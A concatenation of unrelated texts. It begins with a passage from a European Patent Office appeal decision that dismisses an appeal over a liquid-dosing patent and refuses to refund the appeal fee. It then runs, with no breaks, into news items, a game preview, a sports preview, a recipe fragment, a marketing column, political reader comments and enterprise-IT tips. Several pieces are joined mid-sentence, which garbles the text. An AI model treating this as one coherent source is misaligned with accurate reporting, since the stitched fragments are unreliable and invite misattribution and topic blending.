4. 3rd auxiliary request (named 4th auxiliary request in the above letter):
Maintenance of the patent in its granted form with the introduction of the features: "the slugs, upon discharge at least at one zone, have a peak concentration substantially higher than the concentration of a homogeneous solution of the treatment liquid in the carrier liquid in the pipe" or by the incorporation of granted Claim 3 into the independent Claim 1, in either case the apparatus claims be cancelled.
5. Reimbursement of the appeal fee.
In support of his requests the Appellant essentially submitted the following arguments:
Document D2 can be seen as the closest prior art. The lubricant in D2 can be compared to the treatment liquid and the diluent can be compared to the carrier liquid in the claims of the patent in suit.
However, when the lubricant flows so does the diluent because it is intended that the lubricant be diluted. The valves 58, 72, 90 and 106 (Figure 3) are controlled to admit diluent at different rates thus providing for distribution of liquids of varying concentrations which means liquids of different strengths rather than that in the pipe the concentration of the lubricant varies with time from strong to weak to strong to weak etc. Therefore, D2 contains no disclosure, either explicit or implicit of the introduction of diluent in "discrete slugs" as was alleged by the Opposition Division.
Because D2 does not disclose what the Opposition Division considered it discloses, the combination of D2 and D4 does not take away the inventive step of the subject-matter of Claims 1 and 9 as granted.
Moreover, D4 relates to mixing of gases which is substantially different from introducing discrete slugs into pipes conveying a carrier liquid to zones in a processing line.
The Appellant believes it to be implicit in Claims 1 and 9 as granted that the discrete slugs of treatment liquid which are introduced into the pipes conveying the carrier liquid remain discrete at least to some extent as they are conveyed with the carrier liquid towards the zones to be treated, but if the Appeal Board takes the view that this is not the case, then in order to even more clearly distinguish the invention from the prior art the auxiliary requests comprise clarifications of this point.
Referring to Article 116 EPC the Appellant submitted that if a party wants oral proceedings then oral proceedings shall take place. He was not aware of any rule or decision that states that unless the word "request" is used oral proceedings will not take place. His declaration to reserve the right to oral proceedings could only mean that the Patentee wanted oral proceedings should an adverse decision be contemplated. No other reasonable interpretation could be given to the words "reserve the right". He therefore maintained that a substantial procedural violation occurred which requires refund of the appeal fee.
Moreover, the refusal by the Opposition Division to offer oral proceedings seemed not to be within the spirit of EPO Decision T 283/88 which indicated that if there was any doubt whether a communication amounted to a request for oral proceedings then clarification of the position should be sought. Incidentally, the present situation is to be distinguished from that in EPO Decision T 299/86 (OJ EPO 1988, 86) where the words "reserve my right to request oral proceedings" were used. As a matter of language, because of the use of the verb "reserve" in addition to the verb "request", this statement in itself could not be considered as a "request".
VII. Oral proceeding were held on 6 October 1992 at which only the Respondent was present, however represented by an agent not being authorised as his representative at the time. At the end of the oral proceedings the Chairman announced that the decision would be given in writing and that the agent representing the Respondent at the oral proceedings should file a sub-authorisation within a time limit of one month. The sub-authorisation was filed on 23 October 1992.
VIII. The Respondent requested that the appeal be dismissed. His arguments can be summarised as follows:
Although the "slug" concept of the patent in suit was stressed by the Appellant and also by the Board in its communication, Claim 1 as granted leaves it completely open whether the treatment liquid, introduced as discrete slugs, also arrives at the treatment zone in the form of such slugs. The prior art disclosed in D7 clearly teaches the introduction of a treatment liquid as discrete slugs into pipes conveying it to the various treatment zones. Since Claim 1 as granted is perfectly silent on what happens later, the whole question of whether, and to what degree, later mixing occurs is immaterial.
The various auxiliary requests made would not remove this deficiency. It does not help to say that a slug of treatment liquid, i.e. a portion introduced into the carrier liquid "remains at least partially discrete downstream of the introduction point", as in the first auxiliary request, since this again leaves it perfectly open whether, in the actual treatment zone, there is a completely homogeneous mixture or a series of discrete slugs.
According to the second auxiliary request, the slugs should have a "substantially higher" peak concentration as compared to a homogeneous solution. "Substantially higher" obviously requires interpretation and is intended to cover a situation where it is not meaningful anymore to talk about slugs of treatment liquid "packaged" in a carrier liquid. Instead, this language just describes delivery of a lubricating liquid with a concentration varying more or less with time, i.e. everything that is not exactly a homogeneous constant mix. However such a situation is not different from what happens in the prior art disclosed in US-A-3 552 418 (D17) or when using the arrangement of D7.
In actual practice, i.e. in the operation of an actual processing line, it would neither be possible nor even desirable to transport discrete slugs of treatment liquid, packaged in the carrier liquid, to the treatment zone and eject such slugs there. This point is clearly set out in the affidavit of Richard J. Mehus (a signed original of which was submitted with letter of 10 September 1992).
It does not make any difference that in some prior art documents, homogeneity of the mix is assured by the provision of a mixing device, since in processing line apparatus, the pipework itself already provides the required mixing. In fact, one would in any case end up ejecting a fairly constantly concentrated mix, maybe with a minor residual concentration variation in time, but for all practical purposes a lubricant of constant concentration.
In order to avoid the prior art teachings, the Patentee would have to restrict the claims to discrete slugs of treatment liquid arriving in "packaged" form at the end of the pipe which would be undesirable. On the other hand, the proposed claim language which tries to adhere to the actual conditions encountered in reducing the assumed invention to practice, cannot differentiate over the prior art.
Moreover, as was also pointed out by the Board, the present proposed amendments to the claims (in actual auxiliary requests 1 and 2) are not squarely based on the original disclosure.
Additionally, the last alternative in the new third auxiliary request combining the granted Claims 1 and 3 is unclear and ambiguous and therefore also not suited for the maintenance of the patent.
Reasons for the Decision
1. The appeal complies with the requirements of Articles 106 to 108 and Rules 1(1) and 64 EPC. It is admissible.
2. Procedural questions: (right to be heard)
The Appellant is of the opinion that the final sentence in his observations dated 8 March 1990 reading "The patent proprietors reserve the right to oral proceedings" is to be construed as a request for oral proceedings. Therefore he considers the taking of the contested decision without oral proceedings to be a substantial procedural violation.
If the Appellant's conclusion were right this would indeed represent a severe violation of the right to be heard, which would render the decision under appeal void as from the outset (see: T 283/88, point 5). This in turn would lead to the remittal of the case to the Opposition Division for completion of proper proceedings and taking of a new decision (Article 10, Rules of the Procedure of the Boards of Appeal). Therefore the Board has to judge this allegation notwithstanding the fact that the Appellant did not seek remittal but only requested reimbursement of the appeal fee.
Although it is true that the question whether a request in the legal sense has been made does not merely depend upon the actual use of the word "request" the point made by the Appellant turns out to be unfounded. His allegation in point 16 of the Statement of Grounds of Appeal according to which the mentioned sentence "could only mean that the Patentee wanted oral proceedings should an adverse decision be contemplated" is a mere assertion. The Boards of Appeal have already decided in an earlier case that a statement reading "I reserve my right to request oral proceedings under Article 116 EPC" is not to be construed as an actual request (T 299/86). In contrast to the opinion expressed by the Appellant it appears that the statement here in question is even more general and therefore even further away from an actual request. No circumstances can objectively be seen in this case which could lead to another conclusion. Contrary to the Appellant's allegations this situation is not to be compared to the one judged in T 283/88 where the facts were totally different. While in that case there was an indication of an actual intention to have oral proceedings, that meaning can objectively in no way be attributed to the statement of the Appellant. Instead, his "reservation" communicated to the Opposition Division and to the other party merely the information that he was aware of his rights and that he might sometime in the future decide to take action with regard to filing a request or oral proceedings. By using the word "reserve" he conveyed the message that for the moment he wanted to leave it at that and that he just did not want to take action at that time.
For these reasons the Board concludes that there was no procedural violation during the opposition proceedings.
3. Main request
3.1. Prior art
3.1.1. The nearest prior art is considered to be disclosed in D2. D2 relates to a multiple strength fluid distribution method and apparatus for treating a plurality of zones of a processing line with a liquid such as in sanitary chain conveyor systems. The apparatus comprises a liquid source of a treatment liquid and a diluent supply of a carrier liquid. The treatment liquid and carrier liquid are mixed at a T-joint in the pipeline and carried as a mixture to the zone of the processing line. This prior art thus discloses a method and apparatus comprising the combination of precharacterising features of Claim 1 and Claim 9 of the granted patent.
3.1.2. D7 concerns a chemical dispensing system which provides automated intermittent feed of a quantity of chemical directly into the water line to showers for on-line felt or wire cleaning in the paper industry. By means of adjustable timers the quantity and rate of injection can be set in accordance with a wanted injection program.
3.1.3. D17 was cited by the Respondent after the nine-month period stipulated in Article 99(1) EPC, in his response of 19 December 1991 to the Statement of Grounds of Appeal. Because of its relevance with respect to introducing a treatment liquid by pulses into a diluent liquid and considering that this document was introduced in response to an argument presented by the Appellant in respect of pulsed introduction of treatment liquid, this document is allowed into the proceedings.
D17 discloses a proportional metering apparatus for mixing small amounts of a treatment liquid in a stream of water. D17 provides for the dilution of the concentrated treatment liquid by pulsing it into the flowing liquid diluent using a double ended piston pump. The double ended piston drives the pumping cycle and the piston travel controls the dilution ratio. The system disclosed further comprises electronics for changing the proportionality of a signal supplied to the piston control for adjusting the course of the piston drive.
3.2. Novelty
3.2.1. As follows from the above analysis, the documents considered do not disclose the combination of pre- characterising and characterising features of the independent Claims 1 and 9 of the patent and therefore their subject-matter must be considered novel within the meaning of Article 54 EPC.
This was, in fact, not put into question any longer by the Respondent in the appeal proceedings.
3.3. Inventive step
3.3.1. Considering the prior art arrangement disclosed in D2 it is evident to the skilled person that this known system may cause problems with respect to accurate control of the strength of the mixture to be discharged at a particular point especially when low-concentration solutions are required or when solutions within strict limits must be produced.
The characterising features of Claims 1 or 9 of the patent in suit provide that the treatment liquid is introduced as discrete slugs into the pipes conveying the carrier liquid to each zone the volume of each slug being selectively variable or being introduced into each pipe at a selectively variable frequency.
The underlying technical problem to be solved by the patent is therefore to be seen in the improvement of the known system such that a proper amount of the lubricant or chemical to be mixed with the diluent is available at each treatment zone.
3.3.2. When looking for a solution to this problem the skilled person would, in the Board's opinion, certainly become aware of D7 and D17, since both publications concern mixing of chemicals or other treatment products with a diluent fluid.
In particular D17 discloses an obviously highly accurate mixing method which includes a metering injection pump comprising fine adjustment means for varying the proportionality of the amount of material injected in the carrier fluid (see column 5, lines 32 to 37) which is essentially what is proposed in the characterising parts of the independent Claims 1 and 9.
Having regard to the problem cited above it is, in the opinion of the Board, obvious to the skilled person to incorporate into the known system disclosed in D2 the metering device disclosed in D17 which adaptation is technically straight forward and requires no substantial alterations of the system disclosed in D2.
Furthermore, if different concentrations are necessary at different places of treatment evidently an additional pipeline and mixing equipment should be installed for each zone to be treated differently as would also be necessary in the arrangement of D2. This remaining feature of the independent Claims 1 and 9 cannot therefore be considered of any inventive significance.
3.3.3. The Appellant submitted that it was implicit from the granted independent claims that the treatment liquid, introduced as discrete slugs into the pipe, would remain at least partially discrete up to the discharge point and thus no mixing of the treatment and diluent liquid occurred in the pipe. This opinion cannot be accepted because the patent as published clearly envisages as one alternative mixing of the liquids (see page 1, lines 57, 58) and only preferred embodiments (see page 1, lines 59, 60 and Claims 3 to 6) relate to the idea of keeping the liquids separate.
3.3.4. It thus follows that, when starting from the known method and apparatus disclosed in D2, the disclosures of D17 give the skilled person a direct lead to arrive in an obvious manner at the method and apparatus claimed in Claim 1, respectively, Claim 9 of the patent. These claims are therefore not allowable for lack of inventive step of their subject-matter.
4. Auxiliary requests
4.1. Amendments
4.1.1. In accordance with the first and second auxiliary requests and first alternative of the third auxiliary request features were introduced into the independent claims which, apart from not having a clear counterpart in the application documents as filed, are moreover, in the Board's opinion, of undetermined scope as regards the terms "at least partially discrete" (first auxiliary request) and "a peak concentration substantially higher than" (second and third auxiliary requests). For this reason, the amended claims according to these requests do not comply with the requirement of clarity in the meaning of Article 84 EPC. Although lack of clarity (Article 84 EPC) is no ground for opposition, this article applies when amendments are carried out in the granted claims and therefore the Claims 1 and 9 of the first and second auxiliary requests and Claim 1 of the first alternative of the third auxiliary request cannot be allowed either (Article 102(3) EPC).
4.1.2. The second alternative of the third auxiliary request combines the features of the granted Claims 1 and 3. Here, the specification that the slugs, upon discharge at least at one zone, remain "substantially" concentrated also cannot, in the Board's opinion, be considered to have a sufficiently clear meaning such that it would be possible to differentiate between prior art mixtures and the mixture defined in the claim under consideration.
In this respect the Board follows the opinion expressed by the Respondent that in view of the further limitations defined in Claim 4 the term "substantially concentrated" used in Claim 1 under consideration must be interpreted to include also a very low concentration of the slug which is considerably less than the peak concentration of the slug of at least twice the concentration of a homogeneous solution defined in Claim 4. However, since fluctuations in strength are normal in the mixing systems of the prior art a clear difference with respect to such known systems cannot be achieved by the present definition of "substantially concentrated".
Moreover, the features of Claim 3 introduced in granted Claim 1 solely relate to a desired result leaving it open how this result is achieved in the absence of further features. As was also submitted by the Respondent, the Board takes the view that mixing will inevitably occur in the pipelines to the discharge point because of the flow characteristics within pipes and the turbulences introduced by connecting pieces such as T-joints and bends. Therefore, in the Board's opinion, further essential features are necessary to arrive at the desired result which are however not specified in this independent claim.
For these reasons the second alternative of Claim 1 of the third auxiliary request is not acceptable for lack of clarity and lack of essential features for defining the invention contrary to the requirements of Article 84 EPC.
5. For the above reasons the Board comes to the conclusion that neither the independent claims of the patent as granted nor the amended independent claims according to the auxiliary requests can form the basis for maintenance of the patent as requested by the Appellant. As the Board is bound by the requests made by the Appellant it is not necessary to consider the merits of the subject-matter of the dependent claims.
6. Request for reimbursement of the appeal fee
The Appellant requests reimbursement of the appeal fee on the grounds of a substantial procedural violation (Rule 67 EPC). As set out in detail under point 2 the allegation that a procedural violation occurred is unfounded. Furthermore, reimbursement of an appeal fee is provided for in Rule 67 EPC only if the appeal is deemed to be allowable. This is also not the case here. Therefore the Appellant's request must be rejected.
ORDER
For these reasons, it is decided that:
1. The appeal is dismissed.
2. The request for refund of the appeal fee is rejected. Non-Programmable Single Stage Thermostats Collection

BP Checking If Underwater Plan Slowing Leak
By Eileen Fleming
New Orleans, La. – BP executive Doug Suttles says he's not sure yet if chemicals being poured directly on the oil spilling from its well a mile under water are actually slowing the leak. He says if that technique is working, the oil slick should be smaller. BP says it will have a better idea from flyovers.
"We hope to resume skimming, and I hope this week we can actually use burning as well."
Meantime, drills have broken through the seabed on one of two possible relief wells. That could take three months. An underwater dome system is also being designed and built to cover three leaks at the well and pump oil to a container ship.
For NPR News, I'm Eileen Fleming in New Orleans.(Washington, DC) — Melissa Waver, a second-year student at Suffolk University Law School, has been named winner of the seventh annual ELI-ABA-NAELS Constitutional Environmental Law Student Writing Competition. Ms. Waver will receive a $2000 cash award and publication in the Environmental Law Reporter (ELR), ELI’s flagship journal and the most often cited law review covering environmental and natural resource issues.

How Article III Standing and Rule 24(a) Intervention Could Shape Climate Change Solutions,” examines how a flexible application of Federal Rule of Civil Procedure 24(a) governing third-party intervention could promote more effective implementation of climate change policy. “This thoughtful article proposes an interpretation of intervention requirements that would enable citizens and citizen organizations to participate in ongoing climate change litigation,” said ELI Senior Attorney Jay Austin.
Lewis Bollard, a second-year student at Yale Law School, was named as a competition finalist. His entry, “Ag-Gag: The Unconstitutionality of Laws Restricting Undercover Investigations on Farms,” will also be published in the Environmental Law Reporter.
The annual competition—co-sponsored by ELI’s Endangered Environmental Laws Program, ELI, ABA, and NAELS. The selected articles will be published in ELR® News & Analysis in the fall of 2012.
ELI’s Endangered Environmental Laws Program seeks to defend U.S. environmental law by advancing principles such as broad citizen access to federal courts, uniform minimum federal environmental standards, and leeway for state innovation in environmental protection.

Mesa, AZ – They serve in a wide variety of roles in many City of Mesa departments, including building museum exhibits, helping emergency responders and coaching and officiating at youth sports. The City of Mesa honors its volunteers as part of National Volunteer Week April 6-12. The volunteers were recognized at the April 7 City Council meeting with a proclamation from Mayor Scott Smith.
“We are grateful for the thousands of volunteers who give of their time and energy to the City. Our volunteers provide an invaluable service to Mesa while letting them explore their strengths and use their skills and experience to help others” Mayor Smith said. In 2013, volunteers donated 255,908 hours of service to the City.
Numerous City departments and divisions are enhanced by the services of volunteers, including Parks, Recreation and Commercial Facilities; Library: Police Department; Fire and Medical Department; Arts and Cultural Department and Diversity and Neighborhood Outreach. Parks, Recreation and Commercial Facilities had the most volunteer hours in 2013 with 59,698 hours of service.
While Mesa has a variety of talented hard-working volunteers, there is always a need for more. The City has an online system, making it easier to search for volunteer opportunities based on area of interest, length of time commitment, number of volunteers and more. You can access it at.
The theme for National Volunteer Week is “Celebrate Service.” Celebrate Service captures the meaning of this signature week by honoring the people who dedicate themselves to taking action and solving problems in their communities.

The location and theme of the event changes every year; In 2010 the theme is the art of the kitchen and takes place at the Villa Reale, a magnificent nineteenth-century neoclassical villa home to Milan’s Museum of Modern Art, and the Pinacoteca di Brera, Milan’s most prestigious historic museum. These two venues host a multi-media event telling the story of Italian conviviality through a mosaic of multi-sensorial interventions based on memories, historical imagery and the visionary talent of a wide range of contemporary artists, designers, chefs and curators.
Tutti a Tavola! leads the visitor on a journey to rediscover the Italian preoccupation with conviviality, from the Renaissance to the present day. The expression “Everyone to the table!” brings to mind family, friendship, well-being and togetherness. Sitting together around a table is a rite that is typical of the Italian way of life, in which it is not simply the food that matters but also the way it is presented, shared and consumed in company.Within the setting of the two museums’ existing collections a series of installations and projections will highlight and reinterpret exhibits that celebrate the art of dining, from the most intimate family occasions through to official receptions. The centre piece of the Villa Reale is a giant dining table designed by David Kohn Architects located in the courtyard. The table is dressed with a vase taken from a painting by Morandi on display in the exhibition. The objects are rendered at a scale that suggests the courtyard is a room or that the table is a shelter – the visitor is at once Gulliver and Lilliputian. David Kohn Architects have also used a lightweight scaffolding system by Milanese company Fratelli Marinelli to create a variety of settings for artworks on the ground and first floors of the villa. These range from screens for projections, theatresets for puppets and small strutures for displaying wall hangings.In one of the finest neo-Renaissance interiors of the Villa, David Kohn Architects and Milanese fashion designer Colomba Leddi have created a room within a room of silk curtains printed with fragments of the eighteenth century painting “Il Banchetto in Casa Nani” by Pietro Longhi, which depicts a feast in a Venetian palazzo on the occasion of a visiting dignitary. The installation creates an environment based on the painted scene that visitors can enter into and immerse themselves in the intricate detail given to the description of the guests and the table setting.Tutti a Tavola! is accompanied by a 150-page catalogue, edited by curator Franco Laera, which features an essay by David Kohn on theatre and conviviality.Heading.

What Is It?
Shaun White Snowboarding World Stage is sequel to the 2008 Wii game, Shaun White Snowboarding: Road Trip. World Stage opens up the world of snowboarding to competitions and throttles back on the free riding from the first game, though you can still play with buddies in the multiplayer free mode. The game supports up to four players, although only one person can use the Balance Board while other players have to use the Wiimote and Nunchuck control scheme.
What We Saw
Because I'm a total amateur with Shaun White and not big on the Balance Board, I played a beginner course about five times to get used to the controls and poked around a bit at the campaign mode hub (an airport with an arcade machine) and more difficult course.
How Far Along Is It?
The game is due out in November 2009 – when the novelty of snowboarding in summer will be long gone.
What Needs Improvement?
Counter-intuitive Jumping: This is probably more the Balance Board's fault than World Stage's – but the jumping mechanic takes some getting used to. The rest of the controls are so smoothly integrated into the snowboarding that you barely have to think when it comes to speeding up, slowing down or turning. But when you want to jump, you have to press downward with your feet instead of lifting upward or, you know, jumping. The temptation to jump is so hard to resist, the game is even programmed to chide you about damaging the Balance Board if you so much as rock back and forth on your heels too quickly.
What Should Stay The Same?
The Rest of the Controls: Jumping aside, nearly all of the snowboarding controls were tight and immersive. I thought it was strange to hold the Wiimote in one hand and use the board for the rest when watching someone else play, but I didn't notice it at all once I got my feet-on turn.
Final Thoughts
I know nothing about snowboarding and even less about Shaun White, but World Stage is such an intuitive game, I don't think that matters. What more could you ask for from a serious sports game besides authenticity and a low barrier to entry? I may not go out and buy it for myself, but I'd never turn down a chance to play it – especially on a hot day in July when there's not a beach in sight.

vs.
Hawai'i (0-0) vs. #19 Baylor (0-0)
Saturday, Jan. 10, 2014 | 3 p.m. CT
Honolulu | University of Hawai'i Tennis Center
WACO, Texas - The 19th-ranked Baylor's women's tennis team opens its 2014 dual-match season at Hawai'i on Saturday at 3 p.m. CT at the University of Hawai'i Tennis Complex in Honolulu.
"I know the players are ready to kick the season off with this match," head coach Joey Scrivano said. "There's no secret formula for us. We need to focus on taking care of our side of the court. We'll have to compete hard and play with energy."
Last season, Baylor finished ranked No. 20 in the country, after posting a 17-15 record. The Lady Bears bring back seven letterwinners from that team, including Big 12 Player of the Year Ema Burgic. BU also welcomes newcomer Blair Shankle and transfers Makenzie Craft and Alicia Robinson.
The Lady Bears' roster features one ranked singles player in sophomore Kiah Generette, who is 38th in the country. Meanwhile, BU's doubles tandem of Victoria Kisialeva and Shankle is ranked 37th.
In 2013, Hawai'i posted a 6-14 record and a 4-4 mark in conference play. The Rainbow Wahine made it to the Big West Tournament and had a run to the Big West semifinals before falling to UC Irvine.
"The University of Hawaii has a dangerous team," Scrivano said. "They have returning players with NCAA tournament experience and newcomers with accomplished junior careers. They're a team that you can't underestimate."
BU last played at Hawai'i in 2012, earning a 5-2 victory in Honolulu on Jan. 7. Baylor owns a 3-0 record against the Rainbow Wahine all-time, including a 2-0 mark under Scrivano. The Lady Bears are 9-2 all-time in season openers under Scrivano.
Baylor has spent much of the week in Hawai'i going through training and practices to get ready for the season-opener.
Following the match at Hawai'i, Baylor will return to open its home slate on Jan. 18 with a doubleheader vs. Ohio State at 1 p.m. and vs. Texas Pan-American at 6:30 p.m. at the Hurd Tennis Center.

The funding is part of $360 million in new research projects announced by the Australian Research Council (ARC) and the Federal Minister for Science and Research, Senator Chris Evans this week.
The funding includes $24.8 million for Discovery projects, $8.3 million for Discovery Early Career Researcher Awards (DECRA) and $3.2 million for Linkage Infrastructure Equipment and Facilities (LIEF).
University of Melbourne Deputy Vice-Chancellor (Research), Professor James McCluskey said the grants recognised the range and reach of research projects conducted at the University of Melbourne as well as investments in early career researchers and major research equipment.
Professor McCluskey welcomed the funding and said the grants and quality of the projects was testament to the University of Melbourne’s status as Australia’s leading research university, backing up its performance in recent international university rankings.
“The support from the ARC is based on a rigorous competitive process and reflects the outstanding quality of research at the University of Melbourne,” he said.
“This funding is welcome and is a great investment in the future. We are pleased to be at the forefront of many new projects and ideas.”Dave Hendricks | June 18, 2014 | Comments
Why does it pay for marketers and consumers to stick with email? Because no matter what, it's always going to win, place, or at least show.
Earlier this month, California Chrome became the latest almost-winner of thoroughbred horse racing's Triple Crown. Who wasn't cheering this purple and green-silked underdog from the wrong side of the track?
Once every four or five years you get a horse that is dominant in the early races, only to be shut down when something with fresh legs comes around. In consumer technology, there has not been a Triple Crown winner since the dawning of the desktop personal computer age, 36 years ago. Compaq, Dell, Nokia, Apple, Samsung - all have come close only to be edged out before closing the deal.
Email, the original and largest social network, got edged out several years ago when the large P2P social platforms like Instagram and Snapchat, with their mobile-friendly experiences, arrived on the scene. Sure, you needed an email address to log in to any of these services, but who was paying attention to that little detail? They were winning the hearts of minds of youth and consequently of agencies and advertisers who raced to see who could mount these steeds to victory.
But don't count out early winners. Every year there is a new chance for a Triple Crown winner in the attention and usage race.
With the rise of mobile, that future Triple Crown winner increasingly looks to be an old favorite: email.
The tipping point appears to be - ironically - the rise of the smartphone and tablet and the decline of the desktop, the same things that propelled the challengers to email's ownership of audience and attention.
In our latest report, Email Everywhere: Adapting to the Mobile Nature of Email, we released a treasure trove of statistics that demonstrate beyond a doubt that email is not only increasingly mobile, it is on its way to dominating smartphone and tablet devices at the expense of other services like Snapchat and Instagram. With so many social services competing for, users still remain reliant on email not only for person-to-person communication, but also for authentication and identity management.
With consumers "going mobile," email is staying in the front of the pack and even gaining ground.
What have we learned about next-generation email behaviors?
Among the findings in the report, recipients identified as women apparently open, click, and convert more on ads shown in email newsletters. Now before you claim that this does not apply to you, an ad for this purpose is anything including content. And if you are selling something in an email that you send, then it's an advertisement, whether or not it's a first- or third-party product.
Within this report, you'll see surprising and shocking information about smartphone and tablet performance - including evidence that young people open, click, and convert within email.
With so many ways to spend - and waste - time, why does it pay for marketers and consumers to stick with email? Because no matter what, it's always going to win, place, or at least show. Having a consumer's email address is like having a prized stud in your stable. You have a something that keeps on producing.
Email's got such a bright future, I'm betting on it for the long haul.2009 Toyota Corolla Q&A

= trendingA modern take on a message in a bottle? A Saks Fifth Avenue shopper found a cry for help that had traveled across many oceans and countries... in the bottom of her shopping bag. Stephanie Wilson was looking for her receipt and instead found the handwritten plea, titled "HELP HELP HELP," from Tohnain Emmanuel Njong, a prison laborer in China. Njong wrote that he was being held in a Chinese laogai, a type of labor reform school known to be used to imprison outspoken anti-government political figures.
"We are ill-treated and work like slaves for 13 hours every day producing these bags in bulk in the prison factory," Njong wrote in blue pen. The note went on to detail the isolation, abuse and terrible working conditions he and his fellow prisoners were suffering before concluding with, "Thanks and sorry to bother you."
Wilson stared at the tiny passport photo of a man in an orange jumpsuit included with the letter and was deeply shaken. And no wonder. Especially after the Rana Plaza factory collapse a year ago that killed 1,100 and wounded another 2,500, we are all becoming more and more aware that people are suffering to make things for us that we just throw away. The sad part is, it's not often that we have to confront it so literally.
I remember shopping at a Forever 21 store after reading an expose of the horrible labor practices used to produce "fast fashion" and feeling sick to my stomach. Which is worse: buying a $6 T-shirt knowing that the low price is because of sweat shops or not buying it and putting poverty stricken people out of a job? I didn't ask myself if I really needed another white T-shirt because the answer to that is always yes. And no. And as this situation clearly shows, the problem goes far beyond cheap tees to even the shopping bag they come in. The real question is that now that we know, how can we answer their cry for help?
For Wilson, thankfully Njong also included an email address and the internet set out to track him down. Eventually the note got turned over to the Department of Homeland Security since U.S. law makes it illegal for "products made using slave, convict or indentured labor to be imported into the United States." (Saks denies knowing how the bags were manufactured and has opened up an investigation into their supply chain.)
While the DHS isn't commenting on Njong's case specifically, it did say this is definitely not the first report of a Chinese cry for help ending up in a consumer's hands in the U.S. Also in 2012, a woman found a similar letter in a Halloween decoration she bought from Kmart.
Just something to think about the next time you go shopping and are thrilled with the super deal you got on clearance. Is it really a good deal, after all? Oh, and don't forget to check your bag.

Let sticks rise for approximately 40 minutes until double in size. Just before baking, create slits on the front of each stick with the tip of sharp knife. Bake for about 20 minutes. Five minutes before the breads are fully baked and golden, take them out of the over and brush the sticks with a mixture of olive oil and the chopped cilantro, and press a pecan nut into the tips using a beaten egg to secure them in place.

Puede encontrar más información en la página web de turismo de Australia OccidentalSAN JOSE, Calif. -- Agnes Zawadzki sure knows how to shake things up.
The U.S. junior champ only two years ago, this 16-year-old Des Plaines native outskated not one, not two, but three former winners Thursday night to claim the short program at the U.S. Figure Skating Championships. One of the few women to skate cleanly, her sultry routine to a blues medley earned her 66.24 points and put her three points ahead of defending champion Alissa Czisny going into the free skate Saturday. Ashley Wagner was third.
Contact information ( * required )."
Earlier Thursday, Mary Beth Marley and Rockne Brubaker of Algonquin took a big lead in the pairs competition, winning the short program by more than four points. Marley and Brubaker, who already has two U.S. senior titles with former partner Keauna McLaughlin, scored 65.80 points with their delightfully peppy "Singing in the Rain" program., a two-time Olympian from Park Ridge, at Cheyenne. When she's in character, it's great."It looks like Americans are starting to see the repercussions of the "War on Christmas."
According to E-Poll Market Research, which tracks the popularity of branded characters and celebrities for advertisers, 42 percent of children between the ages of 2 and 5, and 29 percent of kids ages 6 through 12 did not recognize Santa Claus.
Well... kind of.
When shown an image of the Santa character from the 1970 stop-motion television special "Santa Claus Is Comin' To Town," which featured the voices Fred Astaire and Mickey Rooney, the children couldn't identify who the red-suited guy was.
Still, the movie's Kris Kringle did fit Santa's aesthetic norms.
As Coca-Cola puts it, "most people can agree on what Santa Claus looks like -- jolly with a red suit and a white beard." And Coke should know since they claim to be responsible for shaping the modern image of Saint Nick (which is not entirely true).
According to the polls, the kidlets were more likely to recognize Rudolph than Santa!
Oh, the humanity.

The Battery is unrated. It contains material that you would expect in an R-rated movie, including strong language, nudity, and violence. For this reason, we are asking that attendees be at least 17 years old. The movie was created on a budget of only $6,000... it is NOT a Hollywood movie with Milla Jovovich and CGI. It is a quiet, realistic study of two people trying to survive after a zombie apocalypse. But it can also be quite funny (though it is not Shaun of the Dead either). We set out to make something entirely new for the zombie genre and we hope you will enjoy it. Many already have.

Then I found a few mentions of "grapefruit seed extract". It seems it can be used as a preservative for short term things. With it, I think I will be safe keeping a batch in the bathroom for a few weeks without refrigeration. Longer and I would probably need a professional grade preservative. I found a bottle in a health food store.

At a media briefing this afternoon, Sen. Judd Gregg (R-N.H.), one of the GOP point-men in negotiations over the $700 billion Wall Street bailout bill, said he was happy that both presidential candidates suspended their campaigns earlier this week to focus on the current crisis.
"It focused the American people's attention that this is serious and real," Gregg said. "You know something big's happening if you're out there, anywhere, in America."
Gregg's comments were a bipartisan pat on the back for the candidates, but may have meant a little extra to Sen. John McCain (R-Ariz.), who had been roundly criticized for parachuting into the talks on the Hill and mucking things up.
Gregg had tried to give McCain a compliment earlier in the day during an appearance on "Late Edition with Wolf Blitzer," on CNN. But Chris Dodd (D-Conn.), who was also on the show, wouldn't hear of it.
Gregg: "I actually think Senator McCain and Senator Obama were one of the catalysts of this effort..."
Blitzer: "But you don't believe, Sen.."

Dodd and Pelosi better take it easy because if this fails they wont have any one to blame but themselves.
I think McCain did the admiral thing by going to the talks. The American people are beginning to see what Mccain means when he said Obama is not experienced enough. Obama just goes along with crowd. McCain on the other hand takes the initative that's what I am looking for in a leader.
Posted by: mimi362 | September 28, 2008 6:58 PM
What in the world would anyone expect from Gregg other than partisan hogwash. He has no ideas of his own and is totally self serving all of the time. I feel that he is one of the worst senators in the entire senate.

Typically, the water boys of the GOP will try and enhance McCain's dramatic and silly 'airdrop' into the negotiations. I would love to be a fly on the wall of the negotions when all and sundry must have looked at each other and said, "wtf is up with him?"
And this impetuous, cranky old drama queen with his "I don't know but if I find em I'll bring em to ya" Veep choice wants to run the works?popular

Bringing the New App Economy Into Enterprises: 10 Ways to Do Itby Chris Preimesberger
View Your Enterprise Through App GlassesIT managers should start looking at how their back-end systems might become more modular and "app-like."The days of hardware and software vendor lock-in, immobile functionality and proprietary licensing limitations are rapidly going the way of the dinosaurs.
Marry Rich Capability With Progressive DisclosureIntegrate the complexities of the real-world enterprise with the single-purpose nature of apps using design techniques such as progressive disclosure (the technique that helps ramp up users from simple to more complex actions).
Evolve Software Distribution Into 'Shopping'An app store is a good and well-understood experience; the IT help desk can be the opposite. The same can go for software provisioning in an enterprise. If you focus on the end-user experience, the rest will follow.
Transform Corporate Bonuses Into RevenueThis is a way to foster entrepreneurship in-house, by linking bonuses to the revenue produced by apps. This might be in the "far-out-there" category, but it's an important idea to keep in mind for the future.
Blur Trust BoundariesYou cannot erase the lines or "trust boundaries" between the enterprise and the external world (customers and partners), but you can make it easier and more porous for information to flow in and out. A well-constructed data access and security system that fits your company or industry is a must, but keeping the user in mind has to be priority No. 1.
Cultivate Internal, Partner, and Customer 'Entrepreneurs'Well-designed and promoted APIs can be a valuable link among organizations working together toward a common goal. Partnersespecially small partners or vendors selling to a bigger companyoften are eager to help push innovation into an enterprise through an API.
Budget Small, Fail Fast and Iterate QuicklyOpt for slower, more agile development over waterfall (all-at-once) development. This enables a smaller, iterative budget and the ability to learn lessons quickly. Failures often can be better spotted in an iterative environment.
